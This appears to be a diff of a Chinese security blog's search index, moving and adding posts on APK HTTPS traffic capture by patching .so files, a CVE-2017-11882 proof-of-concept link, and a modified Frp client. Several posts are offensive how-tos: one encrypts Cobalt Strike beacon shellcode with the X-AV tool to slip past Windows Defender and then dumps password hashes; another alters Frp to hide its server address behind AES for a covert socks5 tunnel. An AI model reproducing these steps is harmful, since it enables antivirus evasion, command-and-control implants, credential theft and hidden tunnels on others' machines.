@@ -55,50 +55,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Apk抓包 - 抓不到解决方案</title>
-    <url>/2022/11/02/Apk%E6%8A%93%E5%8C%85-%E6%8A%93%E4%B8%8D%E5%88%B0%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a class="header-anchor" href="#0x01-前言">¶</a>0x01 前言</h2>
-<p>很多 <code>apk</code> 设置代理后，抓包都会出现没有包的情况，一部分原因就是使用 <code>so</code> 文件 <code>https</code></p>
-<p>经过大佬的一通研究后，用了意想不到的解决方案突破了该问题，高，实在是高，学习并记录</p>
-<h2 id="0x02-解决方案"><a class="header-anchor" href="#0x02-解决方案">¶</a>0x02 解决方案</h2>
-<p>正常抓包，模拟器配置好代理和 <code>fiddler</code> ，我这用的夜神，<code>magisk+LSP+justTrustme</code> 后开始按照正常流程抓包，可见无任何流量</p>
-<h3 id="1-查找域名"><a class="header-anchor" href="#1-查找域名">¶</a>1. 查找域名</h3>
-<p><code>winrar</code> 解包 <code>apk</code> ，使用 <code>npp</code> 搜索相关域名，搜出3处 <code>so</code> 文件，在其中搜索 <code>https</code> 包含大量请求</p>
-<span id="more"></span>
-<p><img src="npp.png" alt="npp"></p>
-<h3 id="2-替换https"><a class="header-anchor" href="#2-替换https">¶</a>2. 替换https</h3>
-<p>使用如下 <code>py</code> 代码替换 <code>https</code> 为 <code>http</code>，替换上述3个文件</p>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">open</span>(<span class="string">r'libapp.so'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">t = re.sub(<span class="string">b'https://([\d\w\.]*?)/'</span>,<span class="string">b'http://\\1//'</span>,t)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">'libapp.so'</span>,<span class="string">'wb'</span>).write(t)</span><br></pre></td></tr></tbody></table></figure>
-<h3 id="3-替换so文件"><a class="header-anchor" href="#3-替换so文件">¶</a>3. 替换so文件</h3>
-<p>将更改的<code>so</code>文件替换到<code>app</code>对应系统目录下，如果有就替换，没有就直接放入</p>
-<blockquote>
-<p>/data/app/[app 名]/</p>
-</blockquote>
-<p><img src="mt.png" alt="mt"></p>
-<h3 id="4-抓包"><a class="header-anchor" href="#4-抓包">¶</a>4. 抓包</h3>
-<p>打开app，查看<code>proxifier</code>走向可看到<code>ip</code>走向已从<code>443</code>变为<code>80</code>，证明so文件加载成功</p>
-<p><img src="80.png" alt="80"></p>
-<p><code>proxifier</code>添加<code>http</code>规则，使该<code>ip</code>代理到fiddler</p>
-<p><img src="rules.png" alt="rules"></p>
-<h3 id="5-替换http"><a class="header-anchor" href="#5-替换http">¶</a>5. 替换http</h3>
-<p><code>ctrl+r</code>打开 <code>fiddler</code> 脚本，在<code>OnBeforeRequest</code>函数内添加如下代码，即为把<code>http</code>请求更改为<code>https</code></p>
-<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// https2http</span></span><br><span class="line"><span class="keyword">if</span>(oSession.oRequest.headers.UriScheme == <span class="string">"http"</span> &amp;&amp; oSession.PathAndQuery.<span class="built_in">IndexOf</span>(<span class="string">"/"</span>) &gt;= <span class="number">0</span>){</span><br><span class="line">	<span class="keyword">while</span>(oSession.PathAndQuery.<span class="built_in">StartsWith</span>(<span class="string">"//"</span>)) {</span><br><span class="line">		oSession.PathAndQuery = oSession.PathAndQuery.<span class="built_in">Replace</span>(<span class="string">"//"</span>,<span class="string">"/"</span>)</span><br><span class="line">	}</span><br><span class="line">	oSession[<span class="string">"ui-backcolor"</span>] = <span class="string">"#999bdd"</span>;</span><br><span class="line">	oSession.oRequest.headers.UriScheme = <span class="string">"https"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<p>fiddler即可正常抓包</p>
-<p><img src="fiddler.png" alt="fiddler"></p>
-<h2 id="0x03-总结"><a class="header-anchor" href="#0x03-总结">¶</a>0x03 总结</h2>
-<p>该方案将<code>https</code>替换成<code>http</code>，没了证书自然抓得到包，最后再通过fiddler替换回去，实现app的正常运行，属于奇技淫巧了</p>
-<p>只要功夫深，铁杵磨成针，大佬yyds</p>
-<p>最后贴一个大佬被自己思路折服的画面，无敌！🙌</p>
-<p><img src="wechat.png" alt="wechat"></p>
-]]></content>
-      <tags>
-        <tag>apk</tag>
-        <tag>抓包</tag>
-        <tag>模拟器</tag>
-        <tag>so</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Apache - Log4j2 RCE复现</title>
     <url>/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<img src="/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/icloud.png" class="">
@@ -144,6 +100,116 @@
         <tag>apache</tag>
         <tag>rce</tag>
         <tag>Log4j2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apk抓包 - 抓不到解决方案</title>
+    <url>/2022/11/02/Apk%E6%8A%93%E5%8C%85-%E6%8A%93%E4%B8%8D%E5%88%B0%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a class="header-anchor" href="#0x01-前言">¶</a>0x01 前言</h2>
+<p>很多 <code>apk</code> 设置代理后，抓包都会出现没有包的情况，一部分原因就是使用 <code>so</code> 文件 <code>https</code></p>
+<p>经过大佬的一通研究后，用了意想不到的解决方案突破了该问题，高，实在是高，学习并记录</p>
+<h2 id="0x02-解决方案"><a class="header-anchor" href="#0x02-解决方案">¶</a>0x02 解决方案</h2>
+<p>正常抓包，模拟器配置好代理和 <code>fiddler</code> ，我这用的夜神，<code>magisk+LSP+justTrustme</code> 后开始按照正常流程抓包，可见无任何流量</p>
+<h3 id="1-查找域名"><a class="header-anchor" href="#1-查找域名">¶</a>1. 查找域名</h3>
+<p><code>winrar</code> 解包 <code>apk</code> ，使用 <code>npp</code> 搜索相关域名，搜出3处 <code>so</code> 文件，在其中搜索 <code>https</code> 包含大量请求</p>
+<span id="more"></span>
+<p><img src="npp.png" alt="npp"></p>
+<h3 id="2-替换https"><a class="header-anchor" href="#2-替换https">¶</a>2. 替换https</h3>
+<p>使用如下 <code>py</code> 代码替换 <code>https</code> 为 <code>http</code>，替换上述3个文件</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">open</span>(<span class="string">r'libapp.so'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">t = re.sub(<span class="string">b'https://([\d\w\.]*?)/'</span>,<span class="string">b'http://\\1//'</span>,t)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">'libapp.so'</span>,<span class="string">'wb'</span>).write(t)</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="3-替换so文件"><a class="header-anchor" href="#3-替换so文件">¶</a>3. 替换so文件</h3>
+<p>将更改的<code>so</code>文件替换到<code>app</code>对应系统目录下，如果有就替换，没有就直接放入</p>
+<blockquote>
+<p>/data/app/[app 名]/</p>
+</blockquote>
+<p><img src="mt.png" alt="mt"></p>
+<h3 id="4-抓包"><a class="header-anchor" href="#4-抓包">¶</a>4. 抓包</h3>
+<p>打开app，查看<code>proxifier</code>走向可看到<code>ip</code>走向已从<code>443</code>变为<code>80</code>，证明so文件加载成功</p>
+<p><img src="80.png" alt="80"></p>
+<p><code>proxifier</code>添加<code>http</code>规则，使该<code>ip</code>代理到fiddler</p>
+<p><img src="rules.png" alt="rules"></p>
+<h3 id="5-替换http"><a class="header-anchor" href="#5-替换http">¶</a>5. 替换http</h3>
+<p><code>ctrl+r</code>打开 <code>fiddler</code> 脚本，在<code>OnBeforeRequest</code>函数内添加如下代码，即为把<code>http</code>请求更改为<code>https</code></p>
+<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// https2http</span></span><br><span class="line"><span class="keyword">if</span>(oSession.oRequest.headers.UriScheme == <span class="string">"http"</span> &amp;&amp; oSession.PathAndQuery.<span class="built_in">IndexOf</span>(<span class="string">"/"</span>) &gt;= <span class="number">0</span>){</span><br><span class="line">	<span class="keyword">while</span>(oSession.PathAndQuery.<span class="built_in">StartsWith</span>(<span class="string">"//"</span>)) {</span><br><span class="line">		oSession.PathAndQuery = oSession.PathAndQuery.<span class="built_in">Replace</span>(<span class="string">"//"</span>,<span class="string">"/"</span>)</span><br><span class="line">	}</span><br><span class="line">	oSession[<span class="string">"ui-backcolor"</span>] = <span class="string">"#999bdd"</span>;</span><br><span class="line">	oSession.oRequest.headers.UriScheme = <span class="string">"https"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>fiddler即可正常抓包</p>
+<p><img src="fiddler.png" alt="fiddler"></p>
+<h2 id="0x03-总结"><a class="header-anchor" href="#0x03-总结">¶</a>0x03 总结</h2>
+<p>该方案将<code>https</code>替换成<code>http</code>，没了证书自然抓得到包，最后再通过fiddler替换回去，实现app的正常运行，属于奇技淫巧了</p>
+<p>只要功夫深，铁杵磨成针，大佬yyds</p>
+<p>最后贴一个大佬被自己思路折服的画面，无敌！🙌</p>
+<p><img src="wechat.png" alt="wechat"></p>
+]]></content>
+      <tags>
+        <tag>apk</tag>
+        <tag>抓包</tag>
+        <tag>模拟器</tag>
+        <tag>so</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CS免杀 - bypass defender</title>
+    <url>/2022/08/09/CS%E5%85%8D%E6%9D%80-bypass-defender/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>最近看到一款过 <code>defender</code> 的免杀工具，挺感兴趣，之所以感兴趣的原因是我觉得目前最强的杀软就是<code>defender</code></p>
+<p>外面有很多过火绒、360之类的，不感兴趣，因为用武之地不大，而且自带的 <code>defender</code> 更强力，过 <code>defender</code> 的意义更大</p>
+<p><strong>X系列安全工具-AV免杀框架-BypassAV</strong></p>
+<blockquote>
+<p><a href="https://github.com/XTeam-Wing/X-AV">https://github.com/XTeam-Wing/X-AV</a></p>
+</blockquote>
+<p>具体介绍就不赘述了，看 <code>README</code> 就好</p>
+<h2 id="安装"><a class="header-anchor" href="#安装">¶</a>安装</h2>
+<p>现在 <code>go</code> 日趋火热，不学点真的跟不上了，这款工具也是 <code>go</code> 开发的</p>
+<span id="more"></span>
+<h3 id="go"><a class="header-anchor" href="#go">¶</a>go</h3>
+<p>不赘述，我这里安装的是新版 <code>go1.18.3</code>，所以导致跑他的程序有很多问题，但又不想降级，所以就一步步排查，解决问题，死磕</p>
+<h3 id="run"><a class="header-anchor" href="#run">¶</a>run</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ShellcodeFrameWork_windows_amd64.exe -shellcodepath mimikatz.exe -o rc4.exe -key wing -encrypt  rc4 -loadermethod uuid</span><br></pre></td></tr></tbody></table></figure>
+<p>直接跑提示 <code>ERROR:exec: "bin/go": file does not exist</code></p>
+<p>看来环境变量没写好，所以把程序放到 <code>go</code> 目录 <code>C:\Program Files\Go</code> 再次运行，提示 <code>STDERR: UUID_agent.go:33:2: cannot find package "github.com/google/uuid" in any of:</code></p>
+<p>使用 <code>go get github.com/google/uuid </code> 报错，按提示改为 <code>go install github.com/google/uuid@latest</code> 报错 <code>package github.com/google/uuid is not a main package</code> ，查了一圈折腾了很久</p>
+<p><strong>解决方案</strong></p>
+<p>在目录 <code>C:\Program Files\Go\src\</code> 下手动创建 <code>github.com/google/</code> ，之后 <code>git clone https://github.com/google/uuid.git</code>，解决该问题</p>
+<p>剩下的报错同理解决</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Program Files\Go\src\golang.org\x&gt;git clone https://github.com/golang/crypto.git</span><br><span class="line">C:\Program Files\Go\src\golang.org\x&gt;git clone https://github.com/golang/sys.git</span><br></pre></td></tr></tbody></table></figure>
+<p>至此，程序跑起来，解决高版本 <code>go</code> 运行问题</p>
+<h2 id="免杀效果"><a class="header-anchor" href="#免杀效果">¶</a>免杀效果</h2>
+<p>一开始我免杀<code>mmk</code>，但跑不起来，才发现该工具为 <code>shellcode</code> 免杀 😅</p>
+<p>生成一个 <code>Windows stageless Raw</code> 用 <code>aes</code> 加密一个试试看免杀效果</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Program Files\Go&gt;x-av.exe -shellcodepath C:\Users\admin\Desktop\beacon.bin -key redn3ck -encrypt aes -loadermethod uuid -salt wakuwaku -o aes.exe</span><br></pre></td></tr></tbody></table></figure>
+<p>我直接放到主机测试，主机是一直在更新的 <code>win10</code>， <code>defender</code> 也是最新的</p>
+<p><img src="defender.png" alt="defender"></p>
+<p>本身程序没报毒没什么，跑起来后也没报，<code>defender</code> 阵亡，免杀效果不错，另外贴上系统版本为 <code>19044.1826</code></p>
+<p><img src="systeminfo.png" alt="systeminfo"></p>
+<p><code>CS</code> 成功上线</p>
+<p><img src="cs.png" alt="cs"></p>
+<h3 id="抓密码"><a class="header-anchor" href="#抓密码">¶</a>抓密码</h3>
+<p>大胆测试一下抓密码，猜测不可以，结果没想到成功抓到密码</p>
+<p><img src="hashdump.png" alt="hashdump"></p>
+<p>但可惜的是这次 <code>defender</code> 复活了，检测到恶意程序，并且弹窗强制<code>1min</code>后关机，我不理解 但我大受震撼.jpg</p>
+<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
+<p>该工具免杀效果不错，相信过了 <code>defender</code>，其他 <code>AV</code> 也不必测试了</p>
+<p>只要不做一些敏感行为，还是可以达到一定效果</p>
+]]></content>
+      <tags>
+        <tag>cs</tag>
+        <tag>免杀</tag>
+        <tag>defender</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2017-11882 POC</title>
+    <url>/2017/11/21/CVE-2017-11882-POC/</url>
+    <content><![CDATA[<h1>POC</h1>
+<p><a href="https://github.com/embedi/CVE-2017-11882">https://github.com/embedi/CVE-2017-11882</a></p>
+<p>如何使用，作者github里写的很清楚</p>
+<p>附上自测gif</p>
+<img src="/2017/11/21/CVE-2017-11882-POC/exp.gif" class="">
+<h1>BTW</h1>
+<p>现在此漏洞被冠上全版本通杀的名号，作者也放出3个版本的视频，但我本地测试，却在2016下未成功</p>
+<p>具体环境：win10 [10.0.16299.64] + 破解激活过的office2016</p>
+]]></content>
+      <tags>
+        <tag>CVE</tag>
       </tags>
   </entry>
   <entry>
@@ -231,72 +297,6 @@
         <tag>CVE</tag>
         <tag>复现</tag>
         <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2017-11882 POC</title>
-    <url>/2017/11/21/CVE-2017-11882-POC/</url>
-    <content><![CDATA[<h1>POC</h1>
-<p><a href="https://github.com/embedi/CVE-2017-11882">https://github.com/embedi/CVE-2017-11882</a></p>
-<p>如何使用，作者github里写的很清楚</p>
-<p>附上自测gif</p>
-<img src="/2017/11/21/CVE-2017-11882-POC/exp.gif" class="">
-<h1>BTW</h1>
-<p>现在此漏洞被冠上全版本通杀的名号，作者也放出3个版本的视频，但我本地测试，却在2016下未成功</p>
-<p>具体环境：win10 [10.0.16299.64] + 破解激活过的office2016</p>
-]]></content>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CS免杀 - bypass defender</title>
-    <url>/2022/08/09/CS%E5%85%8D%E6%9D%80-bypass-defender/</url>
-    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
-<p>最近看到一款过 <code>defender</code> 的免杀工具，挺感兴趣，之所以感兴趣的原因是我觉得目前最强的杀软就是<code>defender</code></p>
-<p>外面有很多过火绒、360之类的，不感兴趣，因为用武之地不大，而且自带的 <code>defender</code> 更强力，过 <code>defender</code> 的意义更大</p>
-<p><strong>X系列安全工具-AV免杀框架-BypassAV</strong></p>
-<blockquote>
-<p><a href="https://github.com/XTeam-Wing/X-AV">https://github.com/XTeam-Wing/X-AV</a></p>
-</blockquote>
-<p>具体介绍就不赘述了，看 <code>README</code> 就好</p>
-<h2 id="安装"><a class="header-anchor" href="#安装">¶</a>安装</h2>
-<p>现在 <code>go</code> 日趋火热，不学点真的跟不上了，这款工具也是 <code>go</code> 开发的</p>
-<span id="more"></span>
-<h3 id="go"><a class="header-anchor" href="#go">¶</a>go</h3>
-<p>不赘述，我这里安装的是新版 <code>go1.18.3</code>，所以导致跑他的程序有很多问题，但又不想降级，所以就一步步排查，解决问题，死磕</p>
-<h3 id="run"><a class="header-anchor" href="#run">¶</a>run</h3>
-<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ShellcodeFrameWork_windows_amd64.exe -shellcodepath mimikatz.exe -o rc4.exe -key wing -encrypt  rc4 -loadermethod uuid</span><br></pre></td></tr></tbody></table></figure>
-<p>直接跑提示 <code>ERROR:exec: "bin/go": file does not exist</code></p>
-<p>看来环境变量没写好，所以把程序放到 <code>go</code> 目录 <code>C:\Program Files\Go</code> 再次运行，提示 <code>STDERR: UUID_agent.go:33:2: cannot find package "github.com/google/uuid" in any of:</code></p>
-<p>使用 <code>go get github.com/google/uuid </code> 报错，按提示改为 <code>go install github.com/google/uuid@latest</code> 报错 <code>package github.com/google/uuid is not a main package</code> ，查了一圈折腾了很久</p>
-<p><strong>解决方案</strong></p>
-<p>在目录 <code>C:\Program Files\Go\src\</code> 下手动创建 <code>github.com/google/</code> ，之后 <code>git clone https://github.com/google/uuid.git</code>，解决该问题</p>
-<p>剩下的报错同理解决</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Program Files\Go\src\golang.org\x&gt;git clone https://github.com/golang/crypto.git</span><br><span class="line">C:\Program Files\Go\src\golang.org\x&gt;git clone https://github.com/golang/sys.git</span><br></pre></td></tr></tbody></table></figure>
-<p>至此，程序跑起来，解决高版本 <code>go</code> 运行问题</p>
-<h2 id="免杀效果"><a class="header-anchor" href="#免杀效果">¶</a>免杀效果</h2>
-<p>一开始我免杀<code>mmk</code>，但跑不起来，才发现该工具为 <code>shellcode</code> 免杀 😅</p>
-<p>生成一个 <code>Windows stageless Raw</code> 用 <code>aes</code> 加密一个试试看免杀效果</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">C:\Program Files\Go&gt;x-av.exe -shellcodepath C:\Users\admin\Desktop\beacon.bin -key redn3ck -encrypt aes -loadermethod uuid -salt wakuwaku -o aes.exe</span><br></pre></td></tr></tbody></table></figure>
-<p>我直接放到主机测试，主机是一直在更新的 <code>win10</code>， <code>defender</code> 也是最新的</p>
-<p><img src="defender.png" alt="defender"></p>
-<p>本身程序没报毒没什么，跑起来后也没报，<code>defender</code> 阵亡，免杀效果不错，另外贴上系统版本为 <code>19044.1826</code></p>
-<p><img src="systeminfo.png" alt="systeminfo"></p>
-<p><code>CS</code> 成功上线</p>
-<p><img src="cs.png" alt="cs"></p>
-<h3 id="抓密码"><a class="header-anchor" href="#抓密码">¶</a>抓密码</h3>
-<p>大胆测试一下抓密码，猜测不可以，结果没想到成功抓到密码</p>
-<p><img src="hashdump.png" alt="hashdump"></p>
-<p>但可惜的是这次 <code>defender</code> 复活了，检测到恶意程序，并且弹窗强制<code>1min</code>后关机，我不理解 但我大受震撼.jpg</p>
-<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
-<p>该工具免杀效果不错，相信过了 <code>defender</code>，其他 <code>AV</code> 也不必测试了</p>
-<p>只要不做一些敏感行为，还是可以达到一定效果</p>
-]]></content>
-      <tags>
-        <tag>cs</tag>
-        <tag>免杀</tag>
-        <tag>defender</tag>
       </tags>
   </entry>
   <entry>
@@ -423,6 +423,48 @@ Windows 10 Version 1809 for 32-bit Systems</p>
         <tag>CVE</tag>
         <tag>复现</tag>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Frp改造 - 参数版+AES加密</title>
+    <url>/2022/01/11/Frp%E6%94%B9%E9%80%A0-%E5%8F%82%E6%95%B0%E7%89%88-AES%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>参数版已经有很多大佬改造过了，因为最近有需求需要把参数加密化，网上没找到现成的，所以手动改造，顺便学一点<code>go</code>语言 😅</p>
+<p>基于<code>uknowsec</code>大佬的文章 <a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">FRP改造计划</a>，实现作者说的：</p>
+<blockquote>
+<p>所以可以直接加一些加密啥的，-t参数传入ip加密后的地址，然后在源码里加一个解密的步骤即可。</p>
+</blockquote>
+<p>另外，个人觉得只加密<code>ip</code>不够隐蔽，所以连同<code>port</code>一起进行<code>AES</code>加密</p>
+<h2 id="改造"><a class="header-anchor" href="#改造">¶</a>改造</h2>
+<p>只需要修改<code>cmd/frpc/sub/root.go</code>即可</p>
+<span id="more"></span>
+<h3 id="1-创建AES函数"><a class="header-anchor" href="#1-创建AES函数">¶</a>1. 创建<code>AES</code>函数</h3>
+<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7Padding</span><span class="params">(ciphertext []<span class="type">byte</span>, blockSize <span class="type">int</span>)</span></span> []<span class="type">byte</span> {</span><br><span class="line">	padding := blockSize - <span class="built_in">len</span>(ciphertext)%blockSize</span><br><span class="line">	padtext := bytes.Repeat([]<span class="type">byte</span>{<span class="type">byte</span>(padding)}, padding)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7UnPadding</span><span class="params">(origData []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> {</span><br><span class="line">	length := <span class="built_in">len</span>(origData)</span><br><span class="line">	unpadding := <span class="type">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncrypt</span><span class="params">(origData, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) {</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	}</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	origData = PKCS7Padding(origData, blockSize)</span><br><span class="line">	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">	crypted := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">	blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">	<span class="keyword">return</span> crypted, <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(crypted, key []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) {</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	}</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">	origData := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(crypted))</span><br><span class="line">	blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">	origData = PKCS7UnPadding(origData)</span><br><span class="line">	<span class="keyword">return</span> origData, <span class="literal">nil</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="2-初始化中定义传参"><a class="header-anchor" href="#2-初始化中定义传参">¶</a>2. 初始化中定义传参</h3>
+<p>只需传一个参数，里面包含<code>ip</code>和<code>port</code>即可</p>
+<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line">func init() {</span><br><span class="line">	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, "config", "c", "./frpc.ini", "config file of frpc")</span><br><span class="line">	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, "version", "v", false, "version of frpc")</span><br><span class="line"><span class="addition">+	rootCmd.PersistentFlags().StringVarP(&amp;ipPort, "ipPort", "t", "", "ip port")</span></span><br><span class="line">	kcpDoneCh = make(chan struct{})</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="3-新增函数"><a class="header-anchor" href="#3-新增函数">¶</a>3. 新增函数</h3>
+<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ipPort <span class="type">string</span>)</span></span> {</span><br><span class="line">	AesKey := []<span class="type">byte</span>(<span class="string">"1qaz2wsx3edc4rfv"</span>)  <span class="comment">// 对称秘钥长度必须是16的倍数</span></span><br><span class="line">	encrypted, _ := base64.StdEncoding.DecodeString(ipPort)</span><br><span class="line">	origin, err := AesDecrypt(encrypted, AesKey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	}</span><br><span class="line">	arr := strings.Fields(<span class="type">string</span>(origin))</span><br><span class="line">	ip := arr[<span class="number">0</span>]</span><br><span class="line">	port := arr[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">var</span> content <span class="type">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">	tls_enable = true</span></span><br><span class="line"><span class="string">    token = socks</span></span><br><span class="line"><span class="string">	[socks]</span></span><br><span class="line"><span class="string">	type = tcp</span></span><br><span class="line"><span class="string">	remote_port = 1800</span></span><br><span class="line"><span class="string">	plugin = socks5</span></span><br><span class="line"><span class="string">	`</span></span><br><span class="line">	fileContent = content</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="4-修改runClient函数"><a class="header-anchor" href="#4-修改runClient函数">¶</a>4. 修改<code>runClient</code>函数</h3>
+<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line"><span class="addition">+ func runClient(cfgFilePath string, ipPort string) (err error) {</span></span><br><span class="line">	var content string</span><br><span class="line"><span class="addition">+	getFileContent(ipPort)</span></span><br><span class="line"><span class="addition">+	// content, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line"><span class="addition">+	content, err = fileContent, nil</span></span><br><span class="line">	if err != nil {</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line">	if err != nil {</span><br><span class="line">		return</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line">	if err != nil {</span><br><span class="line">		return err</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line">	return</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="5-调用runClient"><a class="header-anchor" href="#5-调用runClient">¶</a>5. 调用<code>runClient()</code></h3>
+<figure class="highlight diff"><table><tbody><tr><td class="code"><pre><span class="line">var rootCmd = &amp;cobra.Command{</span><br><span class="line">	Use:   "frpc",</span><br><span class="line">	Short: "frpc is the client of frp (https://github.com/fatedier/frp)",</span><br><span class="line">	RunE: func(cmd *cobra.Command, args []string) error {</span><br><span class="line">		if showVersion {</span><br><span class="line">			fmt.Println(version.Full())</span><br><span class="line">			return nil</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		// Do not show command usage here.</span><br><span class="line"><span class="addition">+		err := runClient(cfgFile, ipPort)</span></span><br><span class="line">		if err != nil {</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			os.Exit(1)</span><br><span class="line">		}</span><br><span class="line">		return nil</span><br><span class="line">	},</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="6-编译"><a class="header-anchor" href="#6-编译">¶</a>6. 编译</h3>
+<p>修改根目录<code>package.sh</code>，实现直接生成编译文件而不打包</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># compile for version</span></span><br><span class="line">make</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"make error"</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">frp_version=`./bin/frps --version`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"build version: <span class="variable">$frp_version</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cross_compiles</span></span><br><span class="line">make -f ./Makefile.cross-compiles</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf ./release/packages</span><br><span class="line"><span class="built_in">mkdir</span> -p ./release/packages</span><br><span class="line"></span><br><span class="line">os_all=<span class="string">'linux windows darwin freebsd'</span></span><br><span class="line">arch_all=<span class="string">'386 amd64 arm arm64 mips64 mips64le mips 